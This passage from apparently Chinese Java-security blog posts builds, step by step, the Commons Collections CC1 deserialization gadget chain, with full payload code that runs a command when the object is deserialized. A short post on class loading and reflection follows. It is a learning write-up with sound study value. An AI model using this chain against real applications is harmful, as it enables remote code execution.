循环遍历 map 来实现访问。 增强 for 循环遍历 map 的底层原理for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) 实际上相当于以下的迭代器实现： 12345Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; iterator = map.entrySet().iterator();while (iterator.hasNext()) &#123; Map.Entry&lt;String, Integer&gt; entry = iterator.next(); // 循环体内的代码&#125; 依此道理，如果将 map 赋值为 AbstractInputCheckedMapDecorator 抽象类的子类， 那么调用 map.entrySet() 方法时，实际上调用的是 AbstractInputCheckedMapDecorator 抽象类中实现的 entrySet() 方法，这个 entrySet() 方法会返回一个 EntrySet 对象， 那么 map.entrySet().iterator() 实际上调用的是 EntrySet 对象的 iterator 方法，而这个方法返回的是一个 EntrySetIterator 对象， 那么在接下来的 while 循环中调用的 iterator.next() 方法其实就是 EntrySetIterator 对象的 next() 方法，这个方法会调用 MapEntry 的构造方法，返回一个 MapEntry 对象， 最终 for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) 这个增强 for 获取到的 entry 就是一个 MapEntry 对象， 最后的最后，我们手动调用这个 entry 的 setValue 方法即可。 至此，整条链子就串联起来了。 写个程序实现上面的利用链payload下面的代码运行后会弹出计算器： 123456789101112131415public class Demo2 &#123; public static void main(String[] args) &#123; Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, invokerTransformer); for (Map.Entry entry : transformedmap.entrySet()) &#123; entry.setValue(runtime); &#125; &#125;&#125; 通过调试来理解其中逻辑Java 代码有一个特点，Java 的实例方法调用是基于运行时的实际类型的动态调用，而非变量的声明类型，这就是 Java 的多态性。 也因此，只有当程序运行起来才知道某个方法调用的究竟是哪个类的方法。所以说：调试是学习过程中必不可少的一环。 前面的逻辑应该都好理解，直接在最后一个 for 循环和 setValue 处下断点： 开始调试，单步进入： 此时来到了 AbstractInputCheckedMapDecorator 抽象类的 entrySet 方法，不过严格来说，应该是调用了 TransformedMap 的 entrySet 方法（因为 TransformedMap 继承了 AbstractInputCheckedMapDecorator 抽象类，拥有了它的所有方法，所以 TransformedMap 中其实是有 entrySet 方法的，只不过在代码上看不到） 所以一个很重要的点是，这里的 this 指代的是谁？指代的是 AbstractInputCheckedMapDecorator 吗？不对，指代的是 TransformedMap 对象，一定记住，因为后续会将这个值层层传递下去。 继续单步进入： 此时来到了 TransformedMap 重写的 isSetValueChecking 方法，由于 valueTransformer 已经被赋值，所以这里应当返回 true 。 继续单步进入： 由于上一步返回 true ，所以这里应当会调用 EntrySet 的构造方法。 继续单步进入： 调用了 EntrySet 的构造方法，并传入一个 TransformedMap 对象给 EntrySet 的私有属性 parent 赋值。 这里可以不用看了，直接 step out 跳出： 回到 entrySet 成员方法这里，此时应当返回一个 EntrySet 对象。 继续单步进入： 此时回到初始代码，准备开始 for 循环。 继续单步进入： 此时来到了 EntrySet 的 iterator 方法，获取 EntrySetIterator 对象。 继续单步进入，选择查看 EntrySetIterator 构造方法： 构造方法中将 EntrySet 的 parent 传了过来，赋值给了自己的私有属性 parent ，此时它是一个 TransformedMap 对象。 这里可以不用看了，直接 step out 跳出： 回到迭代器这里，这个方法将会返回一个 EntrySetIterator 对象。 继续单步进入： 回到了初始代码。 继续单步进入： 开始进行 hasNext 判断，因为是第一次遍历，集合中有值，这里应当返回 true 。 继续单步进入： 回到了初始代码。 继续单步进入： 此时来到了 EntrySetIterator 的 next 方法。 第一步可以不用看，直接 step over 进入下一步，再单步进入： 此时来到了 MapEntry 的构造方法，将 EntrySetIterator 的 parent 值传给了自己的私有属性 parent ，此时它是一个 TransformedMap 对象。 接下来可以不用看了，step out 跳出构造方法，再跳出 EntrySetIterator 的 next 方法，回到初始代码这里： 此时的 entry 是一个 MapEntry 对象，单步进入它的 setValue 方法： 接下来会进入 this.parent 的 checkSetValue 方法，如上所言，this.parent 应当指代的是 TransformedMap 对象，那么接下来会调用这个 TransformedMap 对象的 checkSetValue 方法，单步进入看看： 没问题，接下来会调用 valueTransformer 的 transform 方法，valueTransformer 已经被赋值为一个 InvokerTransformer 对象，接下来将会调用 InvokerTransformer 的 transform 方法。 单步进入： 这个 InvokerTransformer 对象也已经被初始化，前面的 setValue 的参数 runtime 传递给了 checkSetValue ，最后又传递给了 transform ，所以这里的 input 参数应当是一个 Runtime 对象。 到这里就可以直接下一步下一步了，执行完 method.invoke 就会弹出计算器： 好了，后面的就不调了。通过这次调试，想必逻辑大致能理清楚了。 反序列化利用作为一条反序列化利用链，最终还是要归到 readObject 这里，毕竟实际情况下 setValue 可不是我们自己能手动调用的，所以我们要找谁的 readObject 方法里调用了 setValue 。 AnnotationInvocationHandler 类的 readObject 方法里就调用了 setValue 。 入口类 AnnotationInvocationHandler看看 readObject 方法： 1234567891011121314151617181920212223242526private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Map.Entry var5 = (Map.Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) &#123; Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125;&#125; 有没有发现跟前面增强 for 循环的底层原理有几分神似？如果没有发现的话我把这一段截取出来： Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Map.Entry var5 = (Map.Entry)var4.next(); 依葫芦画瓢，我们想让这个 memberValues 变成 TransformedMap 对象，那么同理 var5 将会被赋值为一个 MapEntry 对象。在之后经过两重判断，就会调用 var5 的 setValue 了。 memberValues 是 AnnotationInvocationHandler 类中定义的一个属性： 1private final Map&lt;String, Object&gt; memberValues; 而这个属性在构造方法中被赋值： 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123; this.type = var1; this.memberValues = var2; &#125; else &#123; throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); &#125;&#125; 但是由于构造方法没有被 public 修饰（不写修饰符默认 default ），不能直接调用，所以我们用反射来获取构造方法。 在构造方法中我们也可以看到对传入的参数 var1 做了一些检查： var3 = var1.getInterfaces()：这一行代码获取了 var1 类对象实现的所有接口，并将它们存储在 var3 数组中。 if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class)：这一行代码是一个条件语句，其中包含三个条件： var1.isAnnotation() 检查 var1 是否是一个注解类型。如果 var1 是一个注解类型，则返回 true。 var3.length == 1 检查 var1 实现的接口数量是否为 1。如果是，则返回 true。 var3[0] == Annotation.class 检查 var1 实现的接口中的第一个接口是否是 Annotation 接口。如果是，则返回 true。 为了满足上述条件，我们初步选择传入 Override.class 作为 var1 的值，于是就得到了 payload1 ： payload1123456789101112131415161718192021222324252627282930313233343536373839public class payload1 &#123; public static void main(String[] args) throws Exception &#123; // 获取 Runtime 对象 Runtime r = Runtime.getRuntime(); // 初始化执行类 InvokerTransformer InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;, &quot;value&quot;); // 初始化利用链 TransformedMap Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, invokerTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationConstructor.setAccessible(true); // 为了通过 isAnnotation 判断，选择将 Override.class 传入第一个参数 Object o = annotationInvocationConstructor.newInstance(Override.class, transformedmap); // serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; 先序列化再反序列化，反序列化时应当弹出计算器。但实际上什么也没发生。原因有很多，先来解决第一个。 Runtime 类不能被序列化解决办法翻看 Runtime 类的定义，会发现它并没有实现 Serializable 接口： 1public class Runtime 要如何解决这个问题呢？在前面的学习中我们能发现 InvokerTransformer 类的 transform 方法能够通过执行任意类的任意方法，假如我们让它执行 Runtime.class 对象的 getDeclaredMethod 方法，并将 getRuntime 作为参数传入，那么我们就能获取到 Runtime 的 getRuntime 方法了。 具体代码如下： 12345Method getRuntimeMethod = (Method)new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class); 其实就相当于这句代码： 1Method getRuntimeMethod = Runtime.class.getDeclaredMethod(&quot;getRuntime&quot;,null) 这样得到的 getRuntimeMethod 就是 Runtime 的 getRuntime 方法了。 接下来我要调用 getRuntimeMethod 方法，还是通过 InvokerTransformer 类的 transform 方法来调用： 12345Runtime r = (Runtime) new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;).transform(getRuntimeMethod); 其实就相当于这句代码： 1Runtime runtime = getRuntimeMethod.invoke(null, null) 执行 getRuntime 方法后返回 Runtime 对象，很合理。 接下来我要调用这个 Runtime 对象的 exec 方法，依然是通过 InvokerTransformer 类的 transform 方法来调用： 1new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime); 其实就相当于这句代码： 1runtime.exec(&quot;calc&quot;) 经过上面的三步操作就可以调用 exec 恶意函数了。但其实这段代码还可以再优雅一点，可以用 ChainedTransformer 类来简化操作。 ChainedTransformer 类利用 ChainedTransformer 可将上述三段代码简化成如下代码： 12345678910Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); 要了解具体原理，我们可以查看 chainedTransformer 类的构造方法： 123public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers;&#125; 可以看到，构造方法中接收一个 Transformer 数组，并将这个数组赋值给 this.iTransformers 。 而 iTransformers 是 ChainedTransformer 中定义的属性： 1private final Transformer[] iTransformers; 接着来看 chainedTransformer 类的 transform 方法： 1234567public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; chainedTransformer 类的 transform 方法遍历 iTransformers 数组中的每一个元素并依次执行它们的 transform 方法，并将前一个 transform 方法的结果作为后一个 transform 方法的参数。 看到这里就应该大致能明白了，就是把数组中的每一个 InvokerTransformer 对象取出来再调用它们的 transform 方法，并把上一段代码的输出作为下一段代码的输入，这样就完美替代了上面的三段代码。于是我们得到 payload2： payload2123456789101112131415161718192021222324252627282930313233343536373839404142public class payload2 &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类 InvokerTransformer 的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 随便构造一个 Map 对象作为 TransformedMap.decorate 的参数 HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;, &quot;value&quot;); // 初始化利用链 TransformedMap Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationConstructor.setAccessible(true); // 为了通过 isAnnotation 判断，选择将 Override.class 传入第一个参数 Object o = annotationInvocationConstructor.newInstance(Override.class, transformedmap); serialize(o); // unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; payload2 解决了 Runtime 类不能被序列化的问题，在序列化时，由于 ChainedTransformer 的 transform 方法并没有被执行，所以并没有生成 Runtime 对象，只有在反序列化 readObject 时才被执行。 但是 payload2 还是无法使用，这是因为 AnnotationInvocationHandler 类的 readObject 方法中的最后一个 while 循环中还有两个判断没绕过，以及 var5 的 setValue 方法的参数还没有作控制。 判断绕过这里再贴一下 AnnotationInvocationHandler 类的 readObject 方法：1234567891011121314151617181920212223242526private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Map.Entry var5 = (Map.Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) &#123; Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125;&#125; 第一重判断 if (var7 != null) 绕过为了经过第一重判断，我们需要追本溯源，看看 var7 是怎么来的： 1Class var7 = (Class)var3.get(var6); var7 是通过 var3 的 get 方法获取到的，看看 var3 是怎么来的： 1Map var3 = var2.memberTypes(); var3 是通过 var2 的 memberTypes 方法获取到的 Map 对象，因此 var3 的 get 方法应当是根据键返回对应的值。 看看 var2 怎么来的： 1234567AnnotationType var2 = null;try &#123; var2 = AnnotationType.getInstance(this.type);&#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);&#125; var2 是一个 AnnotationType 对象，见名知义，就是注解类型。这里是调用了 AnnotationType.getInstance 方法再将 this.type 作为参数传入。 而 type 是 AnnotationInvocationHandler 类中定义的一个属性： 1private final Class&lt;? extends Annotation&gt; type; 与 memberValues 一同在构造方法中被赋值： 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123; this.type = var1; this.memberValues = var2; &#125; else &#123; throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); &#125;&#125; 可以看到 this.type 其实就是我们传入的注解类 Override.class 。 梳理一下上面的过程 传入的 Override.class 就是 AnnotationInvocationHandler 类的 type 属性值； type 属性值被传入 AnnotationType.getInstance 方法作为参数，得到的返回值就是 var2 ，而 AnnotationType 类的 getInstance 方法会返回一个包含指定注解的信息的 AnnotationType 对象； 接下来调用 var2 的 memberTypes 方法获取 var2 的 memberTypes 属性，并将其赋值给 var3。memberTypes 属性的值是在 AnnotationType.getInstance 方法调用时被赋予的，即传入的指定注解（Override.class）的成员属性的类型。由于 Override 类并没有成员属性，所以 memberTypes 为空，所以 var3 也为空。 那么接下来通过 var3 的 get 方法获取到的 var7 自然也为空。 解决方案 为了解决这个问题，只需要传入一个有成员属性的注解类即可，这里选择 Target.class（选其他的也可以，比如 Retention.class）： 123456789101112@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)public @interface Target &#123; /** * Returns an array of the kinds of elements an annotation type * can be applied to. * @return an array of the kinds of elements an annotation type * can be applied to */ ElementType[] value();&#125; 并且在调用 var3 的 get 方法时需要传入一个参数 var6 ，所以需要修改 var6 为此时 var3 中存在的键名 value（这个键名是通过调试知道的，后面会调试），这样就能顺利地调用 get 方法获取键名中的键值了。 var6 是这样来的 12Map.Entry var5 = (Map.Entry)var4.next();String var6 = (String)var5.getKey(); 前面在分析入口类 AnnotationInvocationHandler 的 readObject 方法时，我们讲到 var5 应该是一个 MapEntry 对象，这个对象中存储的键值对其实就是我们给 TransformedMap.decorate 方法传入的 map 参数，那么我们直接修改传入的键为 value 即可。 于是得到 payload3： payload3123456789101112131415161718192021222324252627282930313233343536373839404142public class payload3 &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 构造一个 Map 对象，键为 value HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;, &quot;test&quot;); // 初始化利用链 TransformedMap Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationConstructor.setAccessible(true); // 将有成员属性的 Target.class 传入 Object o = annotationInvocationConstructor.newInstance(Target.class, transformedmap); // serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; 第二重判断 if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) 绕过我们通过调试 payload3 来查看此时的 var7 ，var8 分别是什么，顺便解答一下前面的疑惑。 payload3 中在 readObject 处下一个断点： AnnotationInvocationHandler 类的 readObject 方法下四个断点： 开始调试，直接跳断点就可以了： 接下来我们来看 var2 在初始化之后是什么： 可以看到 var2 是一个 AnnotationType 对象，而且其 memberTypes 属性是一个 HashMap 对象，其中的键值对是 “value” -&gt; Target 成员属性的类型 ElementType 。 看看 var3 被赋值后是什么： var3 获取到的是 var2 的 memberTypes 属性值。 看看 var7 被赋值后是什么： var7 获取到的就是 var3 键值对中的值。由于 var7 不为空，进入判断。 **看看 var8 被赋值后是什么，断点不够了再加俩断点： ** var8 获取到的是 payload3 中传入的 map 值，这也在预期之中。 接下来单步进入判断，想不到直接就过去了： 点进 var7 的 isInstance 方法去看了一下，在文档中发现这个方法与 instanceof 等效，instanceof 是判断其左边对象是否为其右边类的实例 ，而 isInstance 是 Class 类中的方法，也是用于判断某个实例是否是某个类的实例化对象，但是指向则相反： 这样就解释得通了，var8 并不是 ElementType 类的对象，var8 也并不是 ExceptionProxy 类的对象，所以这个判断直接过了。 那么就只剩下最后一个问题了：var5 的 setValue 方法参数不可控。 var5 的 setValue 方法参数不可控解决办法按道理，我们想让 var5 的 setValue 方法参数为 Runtime.class ，但是这里的参数明显不能让我们达成目的。这就要提到 Transformer 接口的一个子类 ConstantTransformer 了。 ConstantTransformer 类123456789101112131415161718192021public class ConstantTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = 6374440726369055124L; public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null); private final Object iConstant; public static Transformer getInstance(Object constantToReturn) &#123; return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn)); &#125; public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; public Object getConstant() &#123; return this.iConstant; &#125;&#125; 看 ConstantTransformer 类的 transform 方法会发现：无论传入什么参数，都返回 this.iConstant ，而 iConstant 属性在 ConstantTransformer 的构造方法中被赋值，这个构造方法又被 public 修饰，所以可以直接调用。 那么我们可以将 ConstantTransformer 的 iConstant 属性赋值成 Runtime.class ，然后将其放在 ChainedTransformer 调用链的最上层，这样无论传入什么，ConstantTransformer 的 transform 方法都会返回 Runtime.class 作为下一个 transform 方法的参数。 于是我们得到最终 payload ： 最终 payload1234567891011121314151617181920212223242526272829303132333435363738394041424344public class FinalPayload &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; // 将传入参数固定为 Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 构造一个 Map 对象，键为 value HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;, &quot;test&quot;); // 初始化利用链 TransformedMap Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationConstructor.setAccessible(true); // 将有成员属性的 Target.class 传入（也可以用其他的注解类比如 Retention.class） Object o = annotationInvocationConstructor.newInstance(Target.class, transformedmap); // serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; 结语有时候跳源码看会发现源码晦涩难懂，不如直接调试看结果，根据结果修改输入的参数。 Ref：https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#IL3zn","categories":["Java 安全"]},{"title":"基础篇 - Java 的类加载与反射","path":"/2024/05/10/Java 安全/基础篇-Java的类加载与反射/","content":"本文介绍了 Java 的类加载与反射机制，概括了获得 Class 对象的几种方式，以及总结了反射获取类信息的方法。 类加载机制概述class 文件由类装载器装载后，在 JVM 中将形成一份描述 Class 结构的元信息对象，通过该元信息对象可以获知 Class 的结构信息：如构造函数，属性和方法等，Java 允许用户借由这个 Class 相关的元信息对象间接调用 Class 对象的功能。 虚拟机把描述类的数据从 class 文件加载到内存，并对数据进行校验，转换解析和初始化，最终形成可以被虚拟机直接使用的 Java 类型，这就是虚拟机的类加载机制。 类加载器ClassLoader ：Java 中的一个抽象类，位于 java.lang 包中，用于实现类的加载机制。 在 Java 中，有三种主要的类加载器： Bootstrap ClassLoader（启动类加载器）： 这是 Java 虚拟机（JVM）自身的一部分，负责加载 Java 的核心类库，如 java.lang 等。它是用本地代码实现的，无法直接在 Java 代码中访问。 Extension ClassLoader（扩展类加载器）： 这个类加载器负责加载 Java 的扩展库，位于 $JAVA_HOME/lib/ext 目录下的 JAR 文件中的类。它是由 sun.misc.Launcher$ExtClassLoader 类实现的。 System ClassLoader 或 Application ClassLoader（系统类加载器或应用程序类加载器）： 这个类加载器负责加载应用程序的类路径（Classpath）中指定的类，包括用户自定义的类。它是由 sun.misc.Launcher$AppClassLoader 类实现的。 获得 Class 对象的几种方式比如现在有一个类 com.newer.test.Student ，获取该类的 class 对象有以下四种方式 通过类名.class 1Class c1 = Student.class; 通过对象的 getClass() 方法，stu 是 Student 类的对象 1Class c2 = stu.getClass(); 通过类加载器获得 class 对象 12ClassLoader classLoader = ClassLoader.getSystemClassLoader();Class c3 = classLoader.loadClass(&quot;com.newer.test.Student&quot;); 通过 Class.forName() 获得 Class 对象 1Class c4 = Class.forName(&quot;com.newer.test.Student&quot;); 反射机制概述反射（Reflection） 是 Java 程序开发语言的特征之一，它允许运行中的 Java 程序对自身进行检查，或者说“自审”，并能直接操作程序的内部属性和方法。 通过反射调用方法的流程反射调用一般分为 3 个步骤： 得到要调用类的 Class 对象 得到要调用的类的方法（Method） 方法调用（invoke） 代码示例： 加载 “com.newer.test.Student” 类，并返回对应的 Class 对象： 1Class cls = Class.forName(&quot;com.newer.test.Student&quot;); 获取名为 “hi”、参数类型为 int 和 String 的方法，并返回对应的 Method 对象： 1Method m = cls.getDeclaredMethod(&quot;hi&quot;,new Class[]&#123;int.class,String.class&#125;); 调用之前获取到的方法： 1m.invoke(cls.newInstance(),18,&quot;zhangsan&quot;); invoke() 方法接收两个参数，第一个参数是要调用方法的对象实例，第二个参数是方法的参数列表。 cls.newInstance() 创建了一个 com.newer.test.Student 的实例，然后调用该实例的 “hi” 方法，传递了参数 18 和 “zhangsan”。 反射获取类的信息获取类构造器 Connstructor&lt;T&gt; getConstructor(Class&lt;?&gt;...parameterTypes)：返回此 Class 对象对应类的带指定形参的 public 构造方法 Constructor&lt;?&gt;[] getConstructors()：返回此 Class 对象对应类的所有 public 构造方法 Constructor&lt;T&gt;[] getDeclaredConstructor(Class&lt;?&gt;...parameterTypes)：返回此 Class 对象对应类的带指定参数的构造方法，所有声明的构造方法均可访问。 Constructor&lt;?&gt;[] getDeclaredConstructors()：返回此 Class 对象对应类的所有声明的构造方法 获取类成员方法 Method getMethod(String name,Class&lt;?&gt;...parameterTypes)：返回此 Class 对象对应类的带指定形参的 public 方法 Method[] getMethods()：返回此 Class 对象对应类的所有 public 方法 Method getDeclaredMethod(string name,Class&lt;?&gt;...parameterTypes)：返回此 Class 对象对应类的带指定形参的方法 Method[] getDeclaredMethods():返回此 Class 对象对应类的全部方法 获取类成员变量 Field getField(String name)：返回此 Class 对象对应类的指定名称的 public 成员变量 Field[] getFields()：返回此 Class 对象对应类的所有 public 成员变量 Field getDeclaredField(String name)：返回此 Class 对象对应类的指定名称的成员变量，与成员变量访问权限无关 Field[] getDeclaredFields()：返回此 Class 对象对应类的全部成员变量，与成员变量的访问权限无关 获取类注解 &lt;A extends Annotation&gt;A getAnnotation(Class&lt;A&gt;annotationClass)：尝试获取该 Class 对象对应类上的指定类型的 Annotation ，如果该类型注解不存在，则返回 null &lt;A extends Annotation&gt;A getDeclaredAnnotation(Class&lt;A&gt;annotationClass)：这是 Java 8 中新增的，该方法获取直接修饰该 Class 对象对应类的指定类型的 Annotation ，如果不存在，则返回 null Annotation[] getAnnotations()：返回修饰该 Class 对象对应类上存在的所有 Annotation ，包括从父类继承而来的注解，但是不能获取到私有方法或字段上的注解 Annotation[] getDeclaredAnnotations()：返回修饰该 Class 对象对应类上存在的所有 Annotation ，不包括从父类继承的注解，可以获取到私有方法或字段上的注解 &lt;A extends Annotation&gt;A[] getAnnotationByType(Class&lt;A&gt;annotationClass)：该方法的功能与前面介绍的 getAnnotation() 方法基本相似，但由于 Java8 增加了重复注解功能，因此需要使用该方法获取修饰该类的指定类型的多个 Annotation &lt;A extends Annotation&gt;A[] getDeclaredAnnotationByType(Class&lt;A&gt;annotationClass)：该方法的功能与前面介绍的 getDeclaredAnnotations() 方法相似，也是因为 Java8 的重复注解的功能，需要使用该方法获取直接修饰该类的指定类型的多个 Annotation 获取该类内部类 Class&lt;?&gt;[] getDeclaredClasses()：返回该 Class 